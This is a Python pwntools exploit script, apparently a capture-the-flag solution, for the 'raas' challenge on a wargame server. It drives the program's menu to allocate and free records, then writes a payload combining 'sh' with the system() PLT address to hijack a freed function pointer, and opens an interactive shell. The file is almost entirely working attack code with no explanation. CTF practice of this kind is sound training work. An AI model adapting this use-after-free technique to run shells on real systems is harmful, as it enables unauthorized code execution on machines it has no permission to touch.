#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x080487A3'):
    raw_input('debug:')
    gdb.attach(io, "set follow-fork-mode parent\nb *" + addr)



elf = ELF('./raas')
system_addr=elf.plt['system']
print "%x" % system_addr
printf_addr=elf.plt['printf']
print "%x" % printf_addr


#  io = process('./raas')

io = remote('hackme.inndy.tw', 7719)

payload="sh\x00\x00"+p32(system_addr)+"b"*3


#  debug()
#io.recvuntil('Where What?')

io.recvuntil('Act > ')
io.sendline('1')
io.recvuntil('Index > ')
io.sendline('1')
io.recvuntil('Type > ')
io.sendline('1')
io.recvuntil('Value > ')
io.sendline('1234')

io.recvuntil('Act > ')
io.sendline('1')
io.recvuntil('Index > ')
io.sendline('2')
io.recvuntil('Type > ')
io.sendline('1')
io.recvuntil('Value > ')
io.sendline("1234")

io.recvuntil('Act > ')
io.sendline('2')
io.recvuntil('Index > ')
io.sendline('1')

io.recvuntil('Act > ')
io.sendline('2')
io.recvuntil('Index > ')
io.sendline('2')

io.recvuntil('Act > ')
io.sendline('1')
io.recvuntil('Index > ')
io.sendline('3')
io.recvuntil('Type > ')
io.sendline('2')
io.recvuntil('Length > ')
io.sendline('12')
io.recvuntil('Value > ')
io.send(payload)

io.recvuntil('Act > ')
io.sendline('1')
io.recvuntil('Index > ')
io.sendline('4')
io.recvuntil('Type > ')
io.sendline('2')
io.recvuntil('Length > ')
io.sendline('7')
io.recvuntil('Value > ')
io.sendline("a"*4)

io.recvuntil('Act > ')
io.sendline('2')
io.recvuntil('Index > ')
io.sendline('1')


io.interactive()
io.close()
